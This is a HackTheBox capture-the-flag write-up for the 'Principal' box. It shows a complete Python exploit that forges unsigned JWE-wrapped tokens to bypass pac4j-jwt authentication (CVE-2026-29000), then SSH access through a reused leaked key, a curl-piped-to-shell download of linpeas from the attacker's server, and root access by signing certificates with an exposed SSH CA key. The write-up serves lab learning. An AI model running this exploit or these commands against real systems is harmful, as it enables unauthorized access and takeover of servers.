---
type: "htb"
title: "HTB: Principal"
description: "pac4j-jwt authentication bypass via CVE-2026-29000, password reuse for foothold, and SSH CA misconfiguration for root."
date: "2026-06-03"
box: "Principal"
difficulty: "medium"
os: "linux"
platform: "HackTheBox"
tags: ["htb", "linux", "web", "jwt", "pac4j", "ssh-ca", "cve-2026-29000"]
draft: false
---

## Recon

Add the target to `/etc/hosts`:

```text
10.129.9.211 principal.htb
```

Start by enumerating open ports:

```bash
nmap -sV -sS -p- -vv 10.129.9.211
```

```text
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack ttl 63 Jetty
```

We have a Jetty web application running on port 8080.

When we open the application we get a login screen and already see this footer fingerprint: `v1.2.0 pac4j`. This is a security framework based on Java that is commonly used to build authentication for web applications.

There is no CVE available for pac4j v1.2.0 specifically, however for another component there is one available, which we will see now.

I fired up Burpsuite and started the web application with Intercept. I browsed the login site and noticed interesting fingerprints. When our client requests `/api/auth/jwks` (a JSON Web Key Set Endpoint) we get a response containing the pac4j-jwt version, and the application's public RSA key:

```http
HTTP/1.1 200 OK
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Type: application/json
Content-Length: 402

{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"}]}
```

After a short Google search I found out that pac4j-jwt/6.0.3 is vulnerable to CVE-2026-29000. It's a CVSS 9.3 in the Authenticator and allows us to forge authentication tokens for any user we want, including admin.

The vulnerable code accepts encrypted JWE tokens that aren't actually signed. We as an attacker can just encrypt a JWT token into a JWE using the server's public RSA key, which we obviously have access to.

Now we could use a public PoC but I don't like that. Pasting exploits without understanding them doesn't make us smarter, so I decided to understand the CVE and code this myself.

---

## Exploitation — CVE-2026-29000 (pac4j-jwt Auth Bypass)

### Own Implementation

```python
#!/usr/bin/env python3

import json
import time
import base64
import requests
import sys
from jwcrypto import jwk, jwe

def fetch_jwks(target):
    response = requests.get(f"{target}/api/auth/jwks")
    data = response.json()
    return data["keys"][0]

def b64url(data):
    # data is already bytes. We encode it into base64url format,
    # strip the "=" padding (JWT doesn't use it),
    # then convert from bytes to a plain Python string so we can build the JWT.
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def make_plain_jwt():
    now = int(time.time())  # current unix timestamp

    # Now we craft the header, we need to make sure to leave the signature algorithm empty. This is the vulnerability.
    header = b64url(json.dumps({"alg": "none"}).encode())

    # Now we craft the payload and just say that we're the user admin.
    payload = b64url(json.dumps({
        "sub": "admin",               # subject, user we claim to be
        "role": "ROLE_ADMIN",         # role that we're pretending to be
        "iss": "principal-platform",  # issuer, so who created this token
        "iat": now,                   # issued at timestamp
        "exp": now + 3600             # expires in 1 hour
    }).encode())

    # By using a trailing dot we leave the signature empty
    return f"{header}.{payload}."

# Now we wanna actually encrypt our fake JWT token

def make_jwe(plain_jwt, key_data):
    # Load the server's public RSA key we grabbed from the response
    pub_key = jwk.JWK(**key_data)

    # Now we create the encryption settings so the server knows how we encrypted our token
    # -> Needs that info in order to decrypt our token properly
    encryption_settings = {
        "alg": "RSA-OAEP-256",  # use RSA public key to protect AES key
        "enc": "A128GCM",       # use AES-128-GCM to encrypt the actual content
        "kid": key_data["kid"], # which key to use (our fetched one)
        "cty": "JWT"            # we hint that the encrypted content is a JWT
    }

    # Actually encrypt our fake JWT
    token = jwe.JWE(
        plaintext=plain_jwt.encode(),              # what we're encrypting
        protected=json.dumps(encryption_settings), # the settings header
        recipient=pub_key                          # encrypt using server's public key
    )

    # serialize(compact=True) gives us a 5-part dot-separated string
    return token.serialize(compact=True)

# Now we define how we send the payload and exploit the application

def exploit(target, forged_token):
    # HTTP Authorization header is how we pass the token to the server
    headers = {"Authorization": f"Bearer {forged_token}"}

    # Endpoints we wanna try
    endpoints = [
        "/dashboard"
    ]

    for endpoint in endpoints:
        try:
            r = requests.get(f"{target}{endpoint}", headers=headers, timeout=10)
            print(f"  {endpoint} -> HTTP {r.status_code}")
            if r.ok:  # r.ok is True for any 2xx response
                print(f"  Response: {r.text[:300]}")  # first 300 chars only
        except Exception as e:
            print(f"  {endpoint} -> Error: {e}")


# Now just put everything together

if __name__ == "__main__":
    # Read target from command line, fall back to localhost for testing
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

    # Fetch the key from the server
    key_data = fetch_jwks(target)
    print(f"[*] Using key: {key_data['kid']}")

    # Step 1: make the unsigned fake JWT
    plain_jwt = make_plain_jwt()
    print(f"[*] Fake JWT (unsigned): {plain_jwt}")

    # Step 2: encrypt it inside a JWE so the server accepts it
    forged = make_jwe(plain_jwt, key_data)
    print(f"[*] Forged JWE token:\n{forged}\n")

    # Step 3: use it
    exploit(target, forged)
```

We successfully exploited the vulnerability and forged the authentication token:

```text
❯ python3 own_exploit.py http://10.129.9.211:8080
[*] Using key: enc-key-1
[*] Fake JWT (unsigned): eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJST0xFX0FETUlOIiwgImlzcyI6ICJwcmluY2lwYWwtcGxhdGZvcm0iLCAiaWF0IjogMTc4MDQzODc1NiwgImV4cCI6IDE3ODA0NDIzNTZ9.
[*] Forged JWE token:
eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9...

  /dashboard -> HTTP 200
  Response: <!DOCTYPE html>
<html lang="en">
...
```

We also get a valid dashboard response, which means the authentication token works as expected.

### Setting the Token in the Browser

Now I was figuring out how to actually use this token. We could use curl to print out the sites but I wanted to actually use the site in the browser. I noticed the site doesn't set cookies or JWT tokens directly, so I had to analyze the application's JS code.

Quickly analyzed `/static/js/app.js` and found constants:

```javascript
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

We now know what endpoints we can visit. A few lines ahead we find the available roles:

```javascript
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};
```

And below that, how the application stores its token:

```javascript
static setToken(token) {
    sessionStorage.setItem('auth_token', token);
}
```

We now found out how to properly set our token into the sessionStorage. We just open the F12 console and run:

```javascript
sessionStorage.setItem('auth_token', 'eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9....')
```

Just like that we have full dashboard access as the administrative user — reload the page and we're in.

---

## Foothold

The dashboard contains recent activity logs and mentions various users like `svc-deploy`, `amorales`, `jthompson` etc. But the most interesting finding lies in the settings page.

In the security information we can see the encryption key used for JWE encryption internally:

```text
Security
authFramework          pac4j-jwt
authFrameworkVersion   6.0.3
jwtAlgorithm           RS256
jweAlgorithm           RSA-OAEP-256
jweEncryption          A128GCM
encryptionKey          D3pl0y_$$H_Now42!
tokenExpiry            3600s
sessionManagement      stateless
```

The question is, was this key maybe re-used by someone? Password re-usage is highly common and should always be checked.

From the dashboard's activity logs we notice that the user `svc-deploy` is issuing SSH certificates:

```text
svc-deploy    SSH certificate issued for deploy-1735400000
```

Since the key was labeled for deployment, password reuse against the `svc-deploy` account seemed worth trying. I ran `ssh svc-deploy@10.129.9.211` using the encryption key as the password and it actually worked. If it didn't we would simply collect all usernames and run a password-spray attack.

Anyways, we land inside the user's home directory and can grab the user flag:

```bash
svc-deploy@principal:~$ ls
user.txt
```

---

## Privilege Escalation — SSH CA Misconfiguration

No sudo rights available:

```bash
svc-deploy@principal:~$ sudo -l
Sorry, user svc-deploy may not run sudo on principal.
```

We move linpeas to the target and run it:

```bash
# On our machine (in the directory where linpeas.sh lives)
python3 -m http.server 80

# On the target
curl http://10.10.16.34/linpeas.sh | sh
```

The machine is also vulnerable to the copyfail kernel exploit (CVE-2026-31431), but that's an unintended path. Therefore I skipped it and stuck to proper enumeration.

Interesting linpeas output:

```text
╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)
-rw-r----- 1 root svc-deploy 33 Jun  2 21:31 /home/svc-deploy/user.txt
-rw-r----- 1 root deployers 168 Mar 10 14:35 /etc/ssh/sshd_config.d/60-principal.conf
-rw-r----- 1 root deployers 288 Mar  5 21:05 /opt/principal/ssh/README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 /opt/principal/ssh/ca
```

Navigating to `/opt/principal/ssh`:

```bash
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub

svc-deploy@principal:/opt/principal/ssh$ cat README.txt
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

This is a classic SSH CA privilege escalation. This is a misconfiguration, we shouldn't have read access to the CA private key file. Using this file we can sign our own SSH certificate as any other user, including root.

We simply `cat` the private key and copy it to our machine to then craft the certificate:

```bash
svc-deploy@principal:/opt/principal/ssh$ cat ca
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

On our machine we generate a new keypair to use for the attack:

```bash
❯ ssh-keygen -t rsa -f /tmp/exploitKey -N ""
Generating public/private rsa key pair.
Your identification has been saved in /tmp/exploitKey
Your public key has been saved in /tmp/exploitKey.pub
```

Give the CA private key the correct permissions:

```bash
❯ chmod 600 ca
```

Then use it to sign our new key, claiming to be `root`:

```bash
❯ ssh-keygen -s ca \
           -I "root_cert" \
           -n root \
           -V +1h \
           /tmp/exploitKey.pub
Signed user key /tmp/exploitKey-cert.pub: id "root_cert" serial 0 for root
```

Use the signed key and its certificate to SSH as root:

```bash
❯ ssh -i /tmp/exploitKey \
    -o CertificateFile=/tmp/exploitKey-cert.pub \
    root@10.129.9.211
```

We successfully escalated to root and can now grab the root flag:

```bash
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@principal:~# cat root.txt
f7fa07d184b10....
```
